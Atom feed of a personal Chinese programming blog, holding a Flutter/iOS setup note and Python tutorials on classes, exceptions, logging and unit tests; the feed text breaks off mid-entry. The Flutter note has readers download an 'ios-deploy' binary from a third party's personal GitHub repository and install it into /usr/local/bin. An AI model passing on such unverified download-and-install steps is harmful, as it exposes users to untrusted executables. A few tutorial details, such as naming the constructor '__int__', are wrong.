<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>zhou shaw</title>
  
  <subtitle>zhou shaw&#39;s blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zhoushaw.github.io/"/>
  <updated>2019-10-16T13:11:19.996Z</updated>
  <id>http://zhoushaw.github.io/</id>
  
  <author>
    <name>zhou shaw</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>flutter</title>
    <link href="http://zhoushaw.github.io/2019/09/27/learning/flutter/flutter%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://zhoushaw.github.io/2019/09/27/learning/flutter/flutter遇到的问题/</id>
    <published>2019-09-27T08:14:00.000Z</published>
    <updated>2019-10-16T13:11:19.996Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本环境问题"><a href="#基本环境问题" class="headerlink" title="基本环境问题"></a>基本环境问题</h2><blockquote><p><code>CocoaPods installed but not initialised</code>问题</p></blockquote><p><a href="https://github.com/flutter/flutter/issues/41291" target="_blank" rel="noopener">flutter CocaPods not initialised</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo gem uninstall cocoapods</span><br><span class="line">sudo gem install cocoapods -v 1.7.5</span><br><span class="line">pod setup</span><br></pre></td></tr></table></figure><p><a href="https://blog.iw3c.com/archive/1147" target="_blank" rel="noopener">真机调试用flutter开发ios应用时出现的问题的总结</a></p><p>app创建名称必须和<code>Bundle Identifier</code>一致</p><blockquote><p>Device doesn’t support wireless sync. AMDeviceStartSe</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ~/Desktop</span><br><span class="line">wget https://raw.githubusercontent.com/kangwang1988/kangwang1988.github.io/master/others/ios-deploy</span><br><span class="line">chmod +x ios-deploy</span><br><span class="line">mv ios-deploy /usr/local/bin</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;基本环境问题&quot;&gt;&lt;a href=&quot;#基本环境问题&quot; class=&quot;headerlink&quot; title=&quot;基本环境问题&quot;&gt;&lt;/a&gt;基本环境问题&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;CocoaPods installed but not initial
      
    
    </summary>
    
      <category term="flutter" scheme="http://zhoushaw.github.io/categories/flutter/"/>
    
    
      <category term="flutter" scheme="http://zhoushaw.github.io/tags/flutter/"/>
    
  </entry>
  
  <entry>
    <title>python面向对象编程</title>
    <link href="http://zhoushaw.github.io/2019/09/18/learning/python/python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/"/>
    <id>http://zhoushaw.github.io/2019/09/18/learning/python/python面向对象编程/</id>
    <published>2019-09-18T02:28:00.000Z</published>
    <updated>2019-10-16T12:35:18.082Z</updated>
    
    <content type="html"><![CDATA[<h1 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h1><h2 id="类和实例"><a href="#类和实例" class="headerlink" title="类和实例"></a>类和实例</h2><blockquote><p>定义类</p></blockquote><p>以Student类为例，在Python中，定义类是通过<code>class</code>关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>class后面紧接着是类名，即Student，类名通常是大写开头的单词，紧接着是(object)，表示该类是从哪个类继承下来的，继承的概念我们后面再讲，通常，如果没有合适的继承类，就使用object类，这是所有类最终都会继承的类(object可省略)</p><p>根据类创造实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bart = Student()</span><br><span class="line">bart</span><br></pre></td></tr></table></figure><blockquote><p>类初始化</p></blockquote><p>在Python中构造函数是<code>__int__</code>，第一个参数是<code>self</code>自身，后续的参数根据调用类时创建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, name, score):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.score = score</span><br></pre></td></tr></table></figure><p>实例的变量名如果以__开头，就变成了一个私有变量（private），只有内部可以访问，外部不能访问:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, name, score):</span><br><span class="line">        self.__name = name</span><br><span class="line">        self.__score = score</span><br><span class="line"></span><br><span class="line">    def print_score(self):</span><br><span class="line">        print(&apos;%s: %s&apos; % (self.__name, self.__score))</span><br></pre></td></tr></table></figure><p><strong>在Python中，变量名类似<strong>xxx</strong>的，也就是以双下划线开头，并且以双下划线结尾的，是特殊变量，特殊变量是可以直接访问的，不是private变量，所以，不能用<strong>name</strong>、<strong>score</strong>这样的变量名</strong></p><h2 id="继承和多态"><a href="#继承和多态" class="headerlink" title="继承和多态"></a>继承和多态</h2><blockquote><p>继承</p></blockquote><p>基类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Animal(object):</span><br><span class="line">    def run(self):</span><br><span class="line">        print(&apos;Animal is running...&apos;)</span><br></pre></td></tr></table></figure><p>当我们需要编写Dog和Cat类时，就可以直接从Animal类继承：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Dog(Animal):</span><br><span class="line">    pass</span><br><span class="line">dog = Dog()</span><br><span class="line">dog.run()</span><br></pre></td></tr></table></figure><blockquote><p>多态</p></blockquote><p>可以在子类上覆盖父类的方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Dog(Animal):</span><br><span class="line">    def run(self):</span><br><span class="line">        print(&apos;Dog is running...&apos;)</span><br></pre></td></tr></table></figure><blockquote><p>判断变量类型</p></blockquote><p>判断一个变量是否是某个类型可以用isinstance()判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">isinstance(a, list)</span><br><span class="line">True</span><br><span class="line">isinstance(b, Animal)</span><br><span class="line">True</span><br><span class="line">isinstance(c, Dog)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>但是通过<code>isinstance</code>，检测出来的结果不仅仅包含父类还包含超类(父类的基类)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = Dog()</span><br><span class="line">isinstance(c, Animal)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><h2 id="获取对象信息"><a href="#获取对象信息" class="headerlink" title="获取对象信息"></a>获取对象信息</h2><blockquote><p>type()</p></blockquote><p>我们来判断对象类型，使用type()函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">type(123)</span><br><span class="line">#&lt;class &apos;int&apos;&gt;</span><br><span class="line"></span><br><span class="line">type(&apos;str&apos;)</span><br><span class="line">#&lt;class &apos;str&apos;&gt;</span><br><span class="line"></span><br><span class="line">type(None)</span><br><span class="line">#&lt;type(None) &apos;NoneType&apos;&gt;</span><br></pre></td></tr></table></figure><p>判断对象类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">type(123)==int</span><br><span class="line">True</span><br><span class="line">type(&apos;abc&apos;)==str</span><br><span class="line">True</span><br><span class="line"></span><br><span class="line">import types</span><br><span class="line">def fn():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">type(fn)==types.FunctionType</span><br><span class="line">True</span><br></pre></td></tr></table></figure><blockquote><p>dir()</p></blockquote><p><code>dir()</code>函数会返回对象上所有的属性和方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir(&apos;ABC&apos;)</span><br><span class="line">[&apos;__add__&apos;, &apos;__class__&apos;,..., &apos;__subclasshook__&apos;, &apos;capitalize&apos;, &apos;casefold&apos;,..., &apos;zfill&apos;]</span><br></pre></td></tr></table></figure><blockquote><p>getattr()、setattr()以及hasattr()，我们可以直接操作一个对象的状态</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hasattr(obj, &apos;x&apos;) # 有属性&apos;x&apos;吗？</span><br><span class="line">setattr(obj, &apos;y&apos;, 19) # 设置一个属性&apos;y&apos;</span><br><span class="line">getattr(obj, &apos;y&apos;) # 获取属性&apos;y&apos;</span><br></pre></td></tr></table></figure><h2 id="类属性"><a href="#类属性" class="headerlink" title="类属性"></a>类属性</h2><p>可通过简单的声明生成类属性，当实例属性与类属性名称相同时，将会获取实例属性的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    name = &apos;Student&apos;</span><br><span class="line">    </span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line">        self.name = &apos;shaw&apos;</span><br><span class="line">        </span><br><span class="line">d = Student()</span><br><span class="line">print(d.name) # shaw</span><br></pre></td></tr></table></figure><p>只有当实例中不存在属性时返回类属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    name = &apos;Student&apos;</span><br><span class="line">d = Student()</span><br><span class="line">print(d.name) # Student</span><br></pre></td></tr></table></figure><h3 id="slots"><a href="#slots" class="headerlink" title="__slots__"></a><code>__slots__</code></h3><blockquote><p>限制类添加属性范围</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">class Student():</span><br><span class="line">    __slots__ = (&apos;age&apos;)</span><br><span class="line">stud1 = Student()</span><br><span class="line">stud1.name = &apos;shaw&apos;</span><br></pre></td></tr></table></figure><p>限制了<code>Student</code>类只能添加<code>age</code>属性，若添加其他属性将会报错，上述例子运行时将会报错</p><p><strong>使用<strong>slots</strong>要注意，<strong>slots</strong>定义的属性仅对当前类实例起作用，对继承的子类是不起作用的。除非子类添加与父类一样的<strong>slots</strong></strong></p><p>###@property</p><p>拦截类属性的<code>setter</code>和<code>getter</code>操作</p><p>定义一个学生类，对学生类的<code>score</code>属性的读写进行校验：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    @property</span><br><span class="line">    def score(self):</span><br><span class="line">        return self._score</span><br><span class="line"></span><br><span class="line">    @score.setter</span><br><span class="line">    def score(self, value):</span><br><span class="line">        if not isinstance(value, int):</span><br><span class="line">            raise ValueError(&apos;score must be an integer!&apos;)</span><br><span class="line">        if value &lt; 0 or value &gt; 100:</span><br><span class="line">            raise ValueError(&apos;score must between 0 ~ 100!&apos;)</span><br><span class="line">        self._score = value</span><br></pre></td></tr></table></figure><p>若只定义<code>getter</code>不定义<code>setter</code>时，<br>该类只有读操作，无法进行写入</p><h2 id="多重继承"><a href="#多重继承" class="headerlink" title="多重继承"></a>多重继承</h2><p>Python可以同时继承多个类</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Mammal()</span><br><span class="line">    pass</span><br><span class="line">class RunnableMixIn()</span><br><span class="line">    pass</span><br><span class="line">class Dog(Mammal, RunnableMixIn):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><h2 id="定制类"><a href="#定制类" class="headerlink" title="定制类"></a>定制类</h2><p>可以通过给类添加一些特殊属性来完善类的功能</p><h3 id="str"><a href="#str" class="headerlink" title="__str__"></a><code>__str__</code></h3><p>我们队类进行<code>print</code>打印时，打印出来的并不能让你了解类的属性和方法的细节，我们可以通过<code>__str__</code>方法来处理打印后的展示的情况，例如下面<code>Student</code>打印实例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">print(Student(&apos;Michael&apos;))</span><br><span class="line">#&lt;__main__.Student object at 0x109afb190&gt;</span><br></pre></td></tr></table></figure><p>从上面的例子可以看到，无法通过过打印类来了解类具体的细节。我们可以通过<code>__str__</code>来定义类<code>str</code>化时，展示的内容</p><blockquote><p>定义str化后的内容</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        self.name = name</span><br><span class="line">    def __str__(self):</span><br><span class="line">        return &apos;Student object (name: %s)&apos; % self.name</span><br><span class="line">    __repr__ = __str__</span><br><span class="line"></span><br><span class="line">print(Student(&apos;Michael&apos;))</span><br><span class="line">#Student object (name: Michael)</span><br></pre></td></tr></table></figure><h3 id="iter"><a href="#iter" class="headerlink" title="__iter__"></a><code>__iter__</code></h3><p>如果类需要被迭代可以通过<code>__iter__</code>和<code>__next__()</code>，iter是用来返回迭代对象，next是用来计算下一个迭代值的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Fib(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.a, self.b = 0, 1 # 初始化两个计数器a，b</span><br><span class="line"></span><br><span class="line">    def __iter__(self):</span><br><span class="line">        return self # 实例本身就是迭代对象，故返回自己</span><br><span class="line"></span><br><span class="line">    def __next__(self):</span><br><span class="line">        self.a, self.b = self.b, self.a + self.b # 计算下一个值</span><br><span class="line">        if self.a &gt; 100000: # 退出循环的条件</span><br><span class="line">            raise StopIteration()</span><br><span class="line">        return self.a # 返回下一个值</span><br></pre></td></tr></table></figure><h3 id="getitem"><a href="#getitem" class="headerlink" title="__getitem__"></a><code>__getitem__</code></h3><p>定义使用下标访问类时，定义返回的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Fib(object):</span><br><span class="line">    def __getitem__(self, n):</span><br><span class="line">        a, b = 1, 1</span><br><span class="line">        for x in range(n):</span><br><span class="line">            a, b = b, a + b</span><br><span class="line">        return a</span><br><span class="line"># f = Fib()</span><br><span class="line"># f[0]</span><br><span class="line">#1</span><br></pre></td></tr></table></figure><h3 id="getattr"><a href="#getattr" class="headerlink" title="__getattr__"></a><code>__getattr__</code></h3><p>当访问不存在属性、或者方法时可以通过在<code>__getattr__</code>中定义返回内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.name = &apos;Michael&apos;</span><br><span class="line">    def __getattr__(self, attr):</span><br><span class="line">        if attr==&apos;age&apos;:</span><br><span class="line">            return 22</span><br><span class="line"># st = Student()</span><br><span class="line"># st.age </span><br><span class="line"># 22</span><br></pre></td></tr></table></figure><p>可以用在动态接口的情况下，做一些异常处理</p><h3 id="call"><a href="#call" class="headerlink" title="__call__"></a><code>__call__</code></h3><p>定义实例被调用时执行的内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    def __call__(self):</span><br><span class="line">        print(&apos;My name is %s.&apos; % self.name)</span><br><span class="line"></span><br><span class="line">s = Student(&apos;Michael&apos;)</span><br><span class="line">s() # self参数不要传入</span><br><span class="line"># My name is Michael.</span><br></pre></td></tr></table></figure><p>通过<code>callable()</code>函数，我们就可以判断一个对象是否是“可调用”对象。</p><h2 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h2><p>在Python中可以将类做成枚举类，可以更形象的使用枚举</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from enum import Enum, unique</span><br><span class="line"></span><br><span class="line">@unique # 用于检测是否有重复</span><br><span class="line">class Weekday(Enum): # 继承枚举类</span><br><span class="line">    Sun = 0 # Sun的value被设定为0</span><br><span class="line">    Mon = 1</span><br><span class="line">    Tue = 2</span><br><span class="line">    Wed = 3</span><br><span class="line">    Thu = 4</span><br><span class="line">    Fri = 5</span><br><span class="line">    Sat = 6</span><br><span class="line"></span><br><span class="line"># day1 = Weekday.Mon</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;面向对象编程&quot;&gt;&lt;a href=&quot;#面向对象编程&quot; class=&quot;headerlink&quot; title=&quot;面向对象编程&quot;&gt;&lt;/a&gt;面向对象编程&lt;/h1&gt;&lt;h2 id=&quot;类和实例&quot;&gt;&lt;a href=&quot;#类和实例&quot; class=&quot;headerlink&quot; title=&quot;类
      
    
    </summary>
    
      <category term="python" scheme="http://zhoushaw.github.io/categories/python/"/>
    
    
      <category term="python" scheme="http://zhoushaw.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python错误、调试和测试</title>
    <link href="http://zhoushaw.github.io/2019/09/18/learning/python/python%E8%B0%83%E8%AF%95/"/>
    <id>http://zhoushaw.github.io/2019/09/18/learning/python/python调试/</id>
    <published>2019-09-17T20:14:00.000Z</published>
    <updated>2019-10-16T12:35:18.082Z</updated>
    
    <content type="html"><![CDATA[<h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>Python通过<code>try...except...finally...</code>的错误处理机制</p><p><a href="https://www.runoob.com/python/python-exceptions.html" target="_blank" rel="noopener">错误原因表</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    正常的操作</span><br><span class="line">   ......................</span><br><span class="line">except:</span><br><span class="line">    发生异常，执行这块代码</span><br><span class="line">   ......................</span><br><span class="line">else:</span><br><span class="line">    如果没有异常执行这块代码</span><br></pre></td></tr></table></figure><blockquote><p>检测所有异常</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import traceback</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">　　1/0</span><br><span class="line">except Exception as e:</span><br><span class="line">　　print(e) # 错误原因</span><br><span class="line">　　traceback.print_exc() # 错误的具体行数</span><br></pre></td></tr></table></figure><blockquote><p>捕获指定错误</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    正常的操作</span><br><span class="line">   ......................</span><br><span class="line">except(Exception1[, Exception2[,...ExceptionN]]]):</span><br><span class="line">   发生以上多个异常中的一个，执行这块代码</span><br><span class="line">   ......................</span><br><span class="line">else:</span><br><span class="line">    如果没有异常执行这块代码</span><br></pre></td></tr></table></figure><p>例如捕获用户退出操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    s=input()</span><br><span class="line">except (KeyboardInterrupt):</span><br><span class="line">    print(&apos;用户中断输入&apos;)</span><br></pre></td></tr></table></figure><blockquote><p>不捕获原因</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    n=10/0</span><br><span class="line">except:</span><br><span class="line">    # print(e)</span><br><span class="line">    traceback.print_exc()</span><br></pre></td></tr></table></figure><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><blockquote><p>print</p></blockquote><p>通过打印内容来进行调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(&apos;&gt;&gt;&gt; n = %d&apos; % n)</span><br></pre></td></tr></table></figure><ul><li>缺点<ul><li>运行时含有大量垃圾信息</li><li>还得删除</li></ul></li></ul><blockquote><p>断言</p></blockquote><p>格式：<code>assert expression [, arguments]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert n != 0, &apos;n is zero!&apos;</span><br></pre></td></tr></table></figure><p>断言<code>n</code>是0，如果是会报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">n = 0 </span><br><span class="line">assert n != 0, &apos;n is zero!&apos;</span><br><span class="line">#AssertionError: n is zero!</span><br></pre></td></tr></table></figure><p>运行时携带<code>-O</code>不报错</p><blockquote><p>logging</p></blockquote><p><code>logging</code>输入日志形式，可以输出到文件</p><hr><p>对应的log类型和权重</p><ul><li>NOTSET（0）</li><li>DEBUG（10）</li><li>INFO（20）</li><li>WARNING（30）</li><li>ERROR（40）</li></ul><p>使用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(filename=&quot;test.log&quot;, filemode=&quot;w&quot;, format=&quot;%(asctime)s %(name)s:%(levelname)s:%(message)s&quot;, datefmt=&quot;%d-%M-%Y %H:%M:%S&quot;, level=logging.DEBUG)</span><br><span class="line"></span><br><span class="line">logging.debug(&apos;This is a debug message&apos;)</span><br><span class="line">logging.info(&apos;This is an info message&apos;)</span><br><span class="line">logging.warning(&apos;This is a warning message&apos;)</span><br><span class="line">logging.error(&apos;This is an error message&apos;)</span><br><span class="line">logging.critical(&apos;This is a critical message&apos;)</span><br></pre></td></tr></table></figure><p>basicConfig函数接收参数：</p><ul><li>filename: 日志保存的文件名</li><li>filemode：文件模式</li><li>format: 日志格式<ul><li><a href="https://docs.python.org/3.7/library/logging.html#logrecord-attributes" target="_blank" rel="noopener">formatter参数格式</a></li></ul></li></ul><h2 id="单元测试"><a href="#单元测试" class="headerlink" title="单元测试"></a>单元测试</h2><p>在Python中我们可以通过<code>unittest</code>模块来编写单元测试，我们将自身的类继承了<code>unittest.TestCase</code>后，将会自动运行类中带有<code>test_</code>开头的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import unittest</span><br><span class="line">class Dict(dict):</span><br><span class="line"></span><br><span class="line">    def __init__(self, **kw):</span><br><span class="line">        super().__init__(**kw)</span><br><span class="line"></span><br><span class="line">    def __getattr__(self, key):</span><br><span class="line">        try:</span><br><span class="line">            return self[key]</span><br><span class="line">        except KeyError:</span><br><span class="line">            raise AttributeError(r&quot;&apos;Dict&apos; object has no attribute &apos;%s&apos;&quot; % key)</span><br><span class="line"></span><br><span class="line">    def __setattr__(self, key, value):</span><br><span class="line">        self[key] = value</span><br><span class="line">        </span><br><span class="line">class TestDict(unittest.TestCase):</span><br><span class="line"></span><br><span class="line">    def test_init(self):</span><br><span class="line">        d = Dict(a=1, b=&apos;test&apos;)</span><br><span class="line">        self.assertEqual(d.a, 1)</span><br><span class="line">        self.assertEqual(d.b, &apos;test&apos;)</span><br><span class="line">        self.assertTrue(isinstance(d, dict))</span><br><span class="line"></span><br><span class="line">    def test_key(self):</span><br><span class="line">        d = Dict()</span><br><span class="line">        d[&apos;key&apos;] = &apos;value&apos;</span><br><span class="line">        self.assertEqual(d.key, &apos;value&apos;)</span><br></pre></td></tr></table></figure><p>通过继承类上面的<code>assertEqual</code>方法进行断言判断</p><blockquote><p>如何运行单元测试</p></blockquote><ul><li>在最后加上两行代码</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure><ul><li>在命令行通过参数<code>-m unittest</code>直接运行单元测试：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m unittest mydict_test</span><br></pre></td></tr></table></figure><h2 id="文档测试"><a href="#文档测试" class="headerlink" title="文档测试"></a>文档测试</h2><p>通过编写文档的形式，指定函数调用，并确定函数的输入和输出值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def abs(n):</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line">    Function to get absolute value of number.</span><br><span class="line">    </span><br><span class="line">    